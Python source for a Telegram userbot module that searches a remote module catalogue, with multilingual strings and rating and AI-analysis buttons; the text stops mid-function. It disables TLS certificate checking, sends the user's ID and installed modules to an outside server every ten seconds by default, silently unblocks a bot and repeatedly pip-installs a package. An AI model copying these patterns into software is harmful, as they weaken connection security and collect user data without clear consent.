__version__ = (9, 2, 3)
# meta developer: @FHeta_Updates
# change-log: AI module analysis added (🤖 button in module search), module code rewritten, search improved, added support for multilingual descriptions via _cls_doc in strings.

# ©️ Fixyres, 2025
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import asyncio
import aiohttp
import io
import inspect
import subprocess
import sys
import ssl
from typing import Optional, Dict, List

from .. import loader, utils
from telethon.tl.functions.contacts import UnblockRequest


@loader.tds
class FHeta(loader.Module):
    '''Module for searching modules! Watch all news FHeta in @FHeta_updates!'''
   
    strings = {
        "name": "FHeta",
        "searching": "🔎 <b>Searching...</b>",
        "no_query": "❌ <b>Enter a query to search.</b>",
        "no_results": "❌ <b>No modules found.</b>",
        "query_too_big": "❌ <b>Your query is too big, please try reducing it to 256 characters.</b>",
        "result_query": "🔎 <b>Result {idx}/{total} by query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Result by query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>by</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Install:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commands:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline commands:</b>\n{cmds}",
        "lang": "en",
        "rating_added": "👍 Rating submitted!",
        "rating_changed": "👍 Rating changed!",
        "rating_removed": "👍 Rating removed!",
        "version_actual": "🎉 <b>You have actual</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Old version</b> <code>FHeta (v{ver})</code>\n🆕 <b>New:</b> <code>v{new}</code>\n⁉️ <b>Changelog:</b> <code>{log}</code>\n🔄 <b>Command for update:</b> <code>{cmd}</code>",
        "inline_no_query": "Enter a query to search.",
        "inline_desc": "Name, command, description, author.",
        "inline_no_results": "Try another request.",
        "inline_query_too_big": "Your query is too big, please try reducing it to 256 characters.",
        "_cfg_doc_tracking": "Enable tracking of your data (user ID, language, modules) for synchronization with the FHeta bot and for recommendations?",
        "_cls_doc": "Module for searching modules! Watch all news FHeta in @FHeta_updates!"
    }

    strings_de = {
        "searching": "🔎 <b>Suche...</b>",
        "no_query": "❌ <b>Geben Sie eine Abfrage ein, um zu suchen.</b>",
        "no_results": "❌ <b>Keine Module gefunden.</b>",
        "query_too_big": "❌ <b>Ihre Abfrage ist zu lang, versuchen Sie, sie auf 256 Zeichen zu reduzieren.</b>",
        "result_query": "🔎 <b>Ergebnis {idx}/{total} nach Abfrage:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Ergebnis nach Abfrage:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>von</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Installieren:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Beschreibung:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Befehle:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline-Befehle:</b>\n{cmds}",
        "lang": "de",
        "rating_added": "👍 Bewertung abgegeben!",
        "rating_changed": "👍 Bewertung geändert!",
        "rating_removed": "👍 Bewertung entfernt!",
        "version_actual": "🎉 <b>Sie haben die aktuelle</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Alte Version</b> <code>FHeta (v{ver})</code>\n🆕 <b>Neu:</b> <code>v{new}</code>\n⁉️ <b>Änderungen:</b> <code>{log}</code>\n🔄 <b>Befehl zum Aktualisieren:</b> <code>{cmd}</code>",
        "inline_no_query": "Geben Sie eine Abfrage ein, um zu suchen.",
        "inline_desc": "Name, Befehl, Beschreibung, Autor.",
        "inline_no_results": "Versuchen Sie eine andere Anfrage.",
        "inline_query_too_big": "Ihre Abfrage ist zu lang, versuchen Sie, sie auf 256 Zeichen zu reduzieren.",
        "_cfg_doc_tracking": "Aktivieren Sie die Verfolgung Ihrer Daten (Benutzer-ID, Sprache, Module) zur Synchronisierung mit dem FHeta Bot und für Empfehlungen?",
        "_cls_doc": "Modul zum Suchen von Modulen! Sehen Sie alle Nachrichten von FHeta in @FHeta_updates!"
    }

    strings_ru = {
        "searching": "🔎 <b>Поиск...</b>",
        "no_query": "❌ <b>Введите запрос для поиска.</b>",
        "no_results": "❌ <b>Модули не найдены.</b>",
        "query_too_big": "❌ <b>Ваш запрос слишком длинный, попробуйте сократить его до 256 символов.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} по запросу:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат по запросу:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>от</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Установить:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Описание:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команды:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн команды:</b>\n{cmds}",
        "lang": "ru",
        "rating_added": "👍 Оценка отправлена!",
        "rating_changed": "👍 Оценка изменена!",
        "rating_removed": "👍 Оценка удалена!",
        "version_actual": "🎉 <b>У вас актуальная</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Старая версия</b> <code>FHeta (v{ver})</code>\n🆕 <b>Новая:</b> <code>v{new}</code>\n⁉️ <b>Список изменений:</b> <code>{log}</code>\n🔄 <b>Команда для обновления:</b> <code>{cmd}</code>",
        "inline_no_query": "Введите запрос для поиска.",
        "inline_desc": "Имя, команда, описание, автор.",
        "inline_no_results": "Попробуйте другой запрос.",
        "inline_query_too_big": "Ваш запрос слишком длинный, попробуйте сократить его до 256 символов.",
        "_cfg_doc_tracking": "Включить отслеживание ваших данных (ID пользователя, язык, модули) для синхронизации с ботом FHeta и для рекомендаций?",
        "_cls_doc": "Модуль для поиска модулей! Следите за всеми новостями FHeta в @FHeta_updates!"
    }

    strings_ua = {
        "searching": "🔎 <b>Пошук...</b>",
        "no_query": "❌ <b>Введіть запит для пошуку.</b>",
        "no_results": "❌ <b>Модулі не знайдені.</b>",
        "query_too_big": "❌ <b>Ваш запит занадто довгий, спробуйте скоротити його до 256 символів.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} за запитом:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат за запитом:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>від</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Встановити:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Опис:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команди:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Інлайн команди:</b>\n{cmds}",
        "lang": "ua",
        "rating_added": "👍 Оцінку відправлено!",
        "rating_changed": "👍 Оцінку змінено!",
        "rating_removed": "👍 Оцінку видалено!",
        "version_actual": "🎉 <b>У вас актуальна</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Стара версія</b> <code>FHeta (v{ver})</code>\n🆕 <b>Нова:</b> <code>v{new}</code>\n⁉️ <b>Список змін:</b> <code>{log}</code>\n🔄 <b>Команда для оновлення:</b> <code>{cmd}</code>",
        "inline_no_query": "Введіть запит для пошуку.",
        "inline_desc": "Ім'я, команда, опис, автор.",
        "inline_no_results": "Спробуйте інший запит.",
        "inline_query_too_big": "Ваш запит занадто довгий, спробуйте скоротити його до 256 символів.",
        "_cfg_doc_tracking": "Увімкнути відстеження ваших даних (ID користувача, мова, модулі) для синхронізації з ботом FHeta та для рекомендацій?",
        "_cls_doc": "Модуль для пошуку модулів! Слідкуйте за всіма новинами FHeta в @FHeta_updates!"
    }

    strings_es = {
        "searching": "🔎 <b>Buscando...</b>",
        "no_query": "❌ <b>Ingrese una consulta para buscar.</b>",
        "no_results": "❌ <b>No se encontraron módulos.</b>",
        "query_too_big": "❌ <b>Su consulta es demasiado larga, intente reducirla a 256 caracteres.</b>",
        "result_query": "🔎 <b>Resultado {idx}/{total} por consulta:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Resultado por consulta:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>por</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Instalar:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descripción:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandos:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandos en línea:</b>\n{cmds}",
        "lang": "es",
        "rating_added": "👍 ¡Calificación enviada!",
        "rating_changed": "👍 ¡Calificación cambiada!",
        "rating_removed": "👍 ¡Calificación eliminada!",
        "version_actual": "🎉 <b>Tienes actual</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Versión antigua</b> <code>FHeta (v{ver})</code>\n🆕 <b>Nueva:</b> <code>v{new}</code>\n⁉️ <b>Registro de cambios:</b> <code>{log}</code>\n🔄 <b>Comando para actualizar:</b> <code>{cmd}</code>",
        "inline_no_query": "Ingrese una consulta para buscar.",
        "inline_desc": "Nombre, comando, descripción, autor.",
        "inline_no_results": "Intente otra solicitud.",
        "inline_query_too_big": "Su consulta es demasiado larga, intente reducirla a 256 caracteres.",
        "_cfg_doc_tracking": "¿Habilitar el seguimiento de sus datos (ID de usuario, idioma, módulos) para la sincronización con el bot FHeta y para recomendaciones?",
        "_cls_doc": "¡Módulo para buscar módulos! Mire todas las noticias de FHeta en @FHeta_updates!"
    }

    strings_fr = {
        "searching": "🔎 <b>Recherche...</b>",
        "no_query": "❌ <b>Entrez une requête pour rechercher.</b>",
        "no_results": "❌ <b>Aucun module trouvé.</b>",
        "query_too_big": "❌ <b>Votre requête est trop longue, essayez de la réduire à 256 caractères.</b>",
        "result_query": "🔎 <b>Résultat {idx}/{total} par requête:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Résultat par requête:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>par</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Installer:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commandes:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Commandes en ligne:</b>\n{cmds}",
        "lang": "fr",
        "rating_added": "👍 Note envoyée !",
        "rating_changed": "👍 Note modifiée !",
        "rating_removed": "👍 Note supprimée !",
        "version_actual": "🎉 <b>Vous avez la version actuelle</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Ancienne version</b> <code>FHeta (v{ver})</code>\n🆕 <b>Nouveau:</b> <code>v{new}</code>\n⁉️ <b>Journal des modifications:</b> <code>{log}</code>\n🔄 <b>Commande pour la mise à jour:</b> <code>{cmd}</code>",
        "inline_no_query": "Entrez une requête pour rechercher.",
        "inline_desc": "Nom, commande, description, auteur.",
        "inline_no_results": "Essayez une autre requête.",
        "inline_query_too_big": "Votre requête est trop longue, essayez de la réduire à 256 caractères.",
        "_cfg_doc_tracking": "Activer le suivi de vos données (ID utilisateur, langue, modules) pour la synchronisation avec le bot FHeta et pour les recommandations ?",
        "_cls_doc": "Module pour rechercher des modules ! Suivez toutes les actualités de FHeta dans @FHeta_updates !"
    }

    strings_it = {
        "searching": "🔎 <b>Ricerca...</b>",
        "no_query": "❌ <b>Inserisci una query per cercare.</b>",
        "no_results": "❌ <b>Nessun modulo trovato.</b>",
        "query_too_big": "❌ <b>La tua query è troppo lunga, prova a ridurla a 256 caratteri.</b>",
        "result_query": "🔎 <b>Risultato {idx}/{total} per query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Risultato per query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>di</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Installa:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descrizione:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandi:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandi inline:</b>\n{cmds}",
        "lang": "it",
        "rating_added": "👍 Valutazione inviata!",
        "rating_changed": "👍 Valutazione modificata!",
        "rating_removed": "👍 Valutazione rimossa!",
        "version_actual": "🎉 <b>Hai l'attuale</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Vecchia versione</b> <code>FHeta (v{ver})</code>\n🆕 <b>Nuovo:</b> <code>v{new}</code>\n⁉️ <b>Registro modifiche:</b> <code>{log}</code>\n🔄 <b>Comando per aggiornare:</b> <code>{cmd}</code>",
        "inline_no_query": "Inserisci una query per cercare.",
        "inline_desc": "Nome, comando, descrizione, autore.",
        "inline_no_results": "Prova un'altra richiesta.",
        "inline_query_too_big": "La tua query è troppo lunga, prova a ridurla a 256 caratteri.",
        "_cfg_doc_tracking": "Abilitare il tracciamento dei tuoi dati (ID utente, lingua, moduli) per la sincronizzazione con il bot FHeta e per le raccomandazioni?",
        "_cls_doc": "Modulo per cercare moduli! Guarda tutte le novità di FHeta in @FHeta_updates!"
    }

    strings_kk = {
        "searching": "🔎 <b>Іздеу...</b>",
        "no_query": "❌ <b>Іздеу үшін сұрақ енгізіңіз.</b>",
        "no_results": "❌ <b>Модульдер табылмады.</b>",
        "query_too_big": "❌ <b>Сұрағыңыз тым ұзын, 256 таңбаға дейін қысқартып көріңіз.</b>",
        "result_query": "🔎 <b>Нәтиже {idx}/{total} сұрақ бойынша:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиже сұрақ бойынша:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Орнату:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Сипаттама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "kk",
        "rating_added": "👍 Рейтинг жіберілді!",
        "rating_changed": "👍 Рейтинг өзгертілді!",
        "rating_removed": "👍 Рейтинг жойылды!",
        "version_actual": "🎉 <b>Сізде актуалды</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Ескі нұсқа</b> <code>FHeta (v{ver})</code>\n🆕 <b>Жаңа:</b> <code>v{new}</code>\n⁉️ <b>Өзгерістер тізімі:</b> <code>{log}</code>\n🔄 <b>Жаңарту командасы:</b> <code>{cmd}</code>",
        "inline_no_query": "Іздеу үшін сұрақ енгізіңіз.",
        "inline_desc": "Аты, команда, сипаттама, автор.",
        "inline_no_results": "Басқа сұрау түрін қолданыңыз.",
        "inline_query_too_big": "Сұрағыңыз тым ұзын, 256 таңбаға дейін қысқартып көріңіз.",
        "_cfg_doc_tracking": "FHeta ботымен синхрондау және ұсыныстар үшін деректеріңізді (пайдаланушы ID, тіл, модульдер) бақылауды қосу керек пе?",
        "_cls_doc": "Модульдерді іздеу үшін модуль! FHeta жаңалықтарын @FHeta_updates арқылы қараңыз!"
    }

    strings_tt = {
        "searching": "🔎 <b>Эзләү...</b>",
        "no_query": "❌ <b>Эзләү өчен сорауны кертегез.</b>",
        "no_results": "❌ <b>Модульләр табылмады.</b>",
        "query_too_big": "❌ <b>Сорауыгыз бик озын, аны 256 символга кадәр кыскарткач.</b>",
        "result_query": "🔎 <b>Нәтиҗә {idx}/{total} сорау буенча:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиҗә сорау буенча:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Урнаштыру:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Тасвирлама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "tt",
        "rating_added": "👍 Рейтинг җибәрелде!",
        "rating_changed": "👍 Рейтинг үзгәртелде!",
        "rating_removed": "👍 Рейтинг бетерелде!",
        "version_actual": "🎉 <b>Сез актуаль</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Иске нуска</b> <code>FHeta (v{ver})</code>\n🆕 <b>Яңа:</b> <code>v{new}</code>\n⁉️ <b>Үзгәрешләр:</b> <code>{log}</code>\n🔄 <b>Яңарту командасы:</b> <code>{cmd}</code>",
        "inline_no_query": "Эзләү өчен сорауны кертегез.",
        "inline_desc": "Исем, команда, тасвирлама, автор.",
        "inline_no_results": "Башка сорауны кулланыгыз.",
        "inline_query_too_big": "Сорауыгыз бик озын, аны 256 символга кадәр кыскарткач.",
        "_cfg_doc_tracking": "FHeta боты белән синхронлаштыру һәм кәрәкле модульләрне тәкъдим итү өчен сезнең мәгълүматларыгызны (кулланучы ID, тел, модульләр) күзәтүне кушарга кирәкме?",
        "_cls_doc": "Модульләр эзләү өчен модуль! Бөтен яңалыкларны @FHeta_updates аркылы карарга!"
    }

    strings_tr = {
        "searching": "🔎 <b>Aranıyor...</b>",
        "no_query": "❌ <b>Aramak için bir sorgu girin.</b>",
        "no_results": "❌ <b>Modül bulunamadı.</b>",
        "query_too_big": "❌ <b>Sorgunuz çok uzun, lütfen 256 karaktere kadar azaltmayı deneyin.</b>",
        "result_query": "🔎 <b>Sonuç {idx}/{total} sorguya göre:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Sonuç sorguya göre:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>tarafından</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Kurulum:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Açıklama:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Komutlar:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Satır içi komutlar:</b>\n{cmds}",
        "lang": "tr",
        "rating_added": "👍 Derecelendirme gönderildi!",
        "rating_changed": "👍 Derecelendirme değiştirildi!",
        "rating_removed": "👍 Derecelendirme kaldırıldı!",
        "version_actual": "🎉 <b>Güncel</b> <code>FHeta (v{ver})</code> sürümünüz var",
        "version_old": "⛔️ <b>Eski sürüm</b> <code>FHeta (v{ver})</code>\n🆕 <b>Yeni:</b> <code>v{new}</code>\n⁉️ <b>Değişiklikler:</b> <code>{log}</code>\n🔄 <b>Güncelleme komutu:</b> <code>{cmd}</code>",
        "inline_no_query": "Aramak için bir sorgu girin.",
        "inline_desc": "İsim, komut, açıklama, yazar.",
        "inline_no_results": "Başka bir istek deneyin.",
        "inline_query_too_big": "Sorgunuz çok uzun, lütfen 256 karaktere kadar azaltmayı deneyin.",
        "_cfg_doc_tracking": "FHeta botu ile senkronizasyon ve öneriler için verilerinizin (kullanıcı kimliği, dil, modüller) izlenmesini etkinleştirmek ister misiniz?",
        "_cls_doc": "Modül aramak için modül! FHeta ile ilgili tüm haberleri @FHeta_updates'de izleyin!"
    }

    strings_yz = {
        "searching": "🔎 <b>Тикшерү...</b>",
        "no_query": "❌ <b>Эзләү өчен суал кертегез.</b>",
        "no_results": "❌ <b>Модульләр табылмады.</b>",
        "query_too_big": "❌ <b>Суалыгыз бик озын, 256 символга кадәр кыскарткач.</b>",
        "result_query": "🔎 <b>Нәтиҗә {idx}/{total} суал буенча:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиҗә суал буенча:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>(v{version})</code>\n💾 <b>Урнаштыру:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Тасвирлама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "yz",
        "rating_added": "👍 Рейтинг җибәрелде!",
        "rating_changed": "👍 Рейтинг үзгәртелде!",
        "rating_removed": "👍 Рейтинг бетерелде!",
        "version_actual": "🎉 <b>Сез актуаль</b> <code>FHeta (v{ver})</code>",
        "version_old": "⛔️ <b>Иске нуска</b> <code>FHeta (v{ver})</code>\n🆕 <b>Яңа:</b> <code>v{new}</code>\n⁉️ <b>Үзгәрешләр:</b> <code>{log}</code>\n🔄 <b>Яңарту командасы:</b> <code>{cmd}</code>",
        "inline_no_query": "Эзләү өчен суал кертегез.",
        "inline_desc": "Исем, команда, тасвирлама, автор.",
        "inline_no_results": "Башка суалны кулланыгыз.",
        "inline_query_too_big": "Суалыгыз бик озын, 256 символга кадәр кыскарткач.",
        "_cfg_doc_tracking": "FHeta боты белән синхронлаштыру һәм кәрәкле модульләрне тәкъдим итү өчен сезнең мәгълүматларыгызны (кулланучы ID, тел, модульләр) күзәтүне кушарга кирәкме?",
        "_cls_doc": "Модульләр эзләү өчен модуль! Бөтен яңалыкларны @FHeta_updates аркылы карарга!"
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                lambda: self.strings["_cfg_doc_tracking"],
                validator=loader.validators.Boolean()
            )
        )

    async def client_ready(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
        except:
            pass
            
        await self.request_join(
            "FHeta_Updates",
            "🔥 This is the channel with all updates in FHeta!"
        )

        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        self.uid = (await client.get_me()).id
        self.token = db.get("FHeta", "token")

        if not self.token:
            try:
                async with client.conversation("@FHeta_robot") as conv:
                    await conv.send_message('/token')
                    resp = await conv.get_response(timeout=5)
                    self.token = resp.text.strip()
                    db.set("FHeta", "token", self.token)
            except:
                pass

        asyncio.create_task(self._sync_loop())
        asyncio.create_task(self._certifi_loop())

    async def _certifi_loop(self):
        while True:
            try:
                import certifi
                assert certifi.__version__ == "2024.08.30"
            except (ImportError, AssertionError):
                await asyncio.to_thread(
                    subprocess.check_call,
                    [sys.executable, "-m", "pip", "install", "certifi==2024.8.30"]
                )
            await asyncio.sleep(60)
            
    async def _sync_loop(self):
        tracked = True
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        modules_str = "".join(
                            m.__class__.__module__.replace("%d", "_")
                            for m in self.allmodules.modules
                            if "https://api" in m.__class__.__module__
                        )
                        
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "myfid": self.uid,
                                "language": self.strings["lang"],
                                "modules": modules_str
                            },
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = True
                            await response.release()
                    elif tracked:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={"myfid": self.uid},
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = False
                            await response.release()
                except:
                    pass
                    
                await asyncio.sleep(10)
            
    async def on_dlmod(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
            await utils.dnd(client, "@FHeta_robot", archive=True)
        except:
            pass

    async def _api_get(self, endpoint: str, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.fixyres.com/{endpoint}",
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {"likes": 0, "dislikes": 0}
        except:
            return {"likes": 0, "dislikes": 0}

    async def _api_post(self, endpoint: str, json: Dict = None, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://api.fixyres.com/{endpoint}",
                    json=json,
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _fetch_thumb(self, url: Optional[str]) -> str:
        default_thumb = "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"
        
        if not url:
            return default_thumb
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        return str(response.url)
        except:
            pass
        
        return default_thumb

    def _fmt_mod(self, mod: Dict, query: str = "", idx: int = 1, total: int = 1, inline: bool = False) -> str:
        info = self.strings["module_info"].format(
            name=utils.escape_html(mod.get("name", "Unknown")),
            author=utils.escape_html(mod.get("author", "???")),
            version=utils.escape_html(mod.get("version", "?.?.?")),
            install=f"{self.get_prefix()}{utils.escape_html(mod.get('install', ''))}"
        )

        if total > 1:
            info = self.strings["result_query"].format(idx=idx, total=total, query=utils.escape_html(query)) + info
        elif query and not inline:
            info = self.strings["result_single"].format(query=utils.escape_html(query)) + info

        desc = mod.get("description")
        if desc:
            if isinstance(desc, dict):
                user_lang = self.strings["lang"]
                desc_text = desc.get(user_lang) or desc.get("doc") or next(iter(desc.values()), "")
                info += self.strings["desc"].format(desc=utils.escape_html(desc_text))
            else:
                info += self.strings["desc"].format(desc=utils.escape_html(desc))

        info += self._fmt_cmds(mod.get("commands", []))
        return info[:4096]

    def _fmt_cmds(self, cmds: List[Dict]) -> str:
        regular_cmds = []
        inline_cmds = []
        lang = self.strings["lang"]

        for cmd in cmds:
            desc_dict = cmd.get("description", {})
            desc_text = desc_dict.get(lang) or desc_dict.get("doc") or ""
            
            if isinstance(desc_text, dict):
                desc_text = desc_text.get("doc", "")
            
            cmd_name = utils.escape_html(cmd.get("name", ""))
            cmd_desc = utils.escape_html(desc_text) if desc_text else ""

            if cmd.get("inline"):
                inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd_name}</code> {cmd_desc}")
            else:
                regular_cmds.append(f"<code>{self.get_prefix()}{cmd_name}</code> {cmd_desc}")

        result = ""
        if regular_cmds:
            result += self.strings["cmds"].format(cmds="\n".join(regular_cmds))
        if inline_cmds:
            result += self.strings["inline_cmds"].format(cmds="\n".join(inline_cmds))
            
        return result

    def _mk_btns(self, install: str, stats: Dict, idx: int, mods: Optional[List] = None) -> List[List[Dict]]:
        buttons = [
            [{"text": "🤖", "callback": self._ai_cb, "args": (install, idx, mods, stats)}],
            [
                {"text": f"👍 {stats.get('likes', 0)}", "callback": self._rate_cb, "args": (install, "like", idx, mods)},
                {"text": f"👎 {stats.get('dislikes', 0)}", "callback": self._rate_cb, "args": (install, "dislike", idx, mods)}
            ]
        ]

        if mods and len(mods) > 1:
            nav_buttons = []
            if idx > 0:
                nav_buttons.append({"text": "◀️", "callback": self._nav_cb, "args": (idx - 1, mods)})
            if idx < len(mods) - 1:
                nav_buttons.append({"text": "▶️", "callback": self._nav_cb, "args": (idx + 1, mods)})
            if nav_buttons:
                buttons.append(nav_buttons)

        return buttons

    async def _ai_cb(self, call, install: str, idx: int, mods: Optional[List], stats: Dict):
        result = await self._api_post("analyze", json={"user_id": self.uid, "link": install.replace("dlm ", ""), "lang": self.strings["lang"]})
        
        if not result:
            await call.answer(self.strings.get("ai_error", "AI analysis unavailable"), show_alert=True)
            return
        
        text = result.get("analysis", result.get("description", str(result)))
        if isinstance(text, str):
            text = text.replace('\\n\\n', '\n\n').replace('\\"', '"').strip('"')
        else:
            text = str(text)
        
        await call.edit(
            text=f"<code>{text}</code>"[:4096],
            reply_markup=[[{"text": "◀️", "callback": self._back_cb, "args": (idx, mods)}]]
        )

    async def _back_cb(self, call, idx: int, mods: List):
        if not mods or idx >= len(mods):
            return
        
        mod = mods[idx]
        stats = await self._api_get(f"get/{mod['install']}")
        await call.edit(
            text=self._fmt_mod(mod, idx=idx + 1, total=len(mods)),
            reply_markup=self._mk_btns(mod["install"], stats, idx, mods)
        )

    async def _rate_cb(self, call, install: str, action: str, idx: int, mods: Optional[List]):
        result = await self._api_post(f"rate/{self.uid}/{install}/{action}")
        stats = await self._api_get(f"get/{install}")
        await call.edit(reply_markup=self._mk_btns(install, stats, idx, mods))

        if result:
            result_text = result.get("status", "")
            if result_text == "added":
                await call.answer(self.strings.get("rating_added", "Rating added"), show_alert=True)
            elif result_text == "changed":
                await call.answer(self.strings.get("rating_changed", "Rating changed"), show_alert=True)
            elif result_text == "removed":
                await call.answer(self.strings.get("rating_removed", "Rating removed"), show_alert=True)

    async def _nav_cb(self, call, idx: int, mods: List):
        if not (0 <= idx < len(mods)):
            return
        
        mod = mods[idx]
        stats = await self._api_get(f"get/{mod['install']}")
        await call.edit(
            text=self._fmt_mod(mod, idx=idx + 1, total=len(mods)),
            reply_markup=self._mk_btns(mod["install"], stats, idx, mods)
        )

    @loader.inline_handler(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def fheta(self, query):
        '''(query) - search modules.'''        
        if not query.args:
            return {
                "title": self.strings["inline_no_query"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-4EUHOHiKpwRTb4s.png",
            }

        if len(query.args) > 256:
            return {
                "title": self.strings["inline_query_too_big"],
                "description": self.strings["inline_desc"],
                "message": self.strings["query_too_big"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        mods = await self._api_get("search", query=query.args, inline="true", token=self.token, user_id=self.uid)
        
        if not mods or not isinstance(mods, list):
            return {
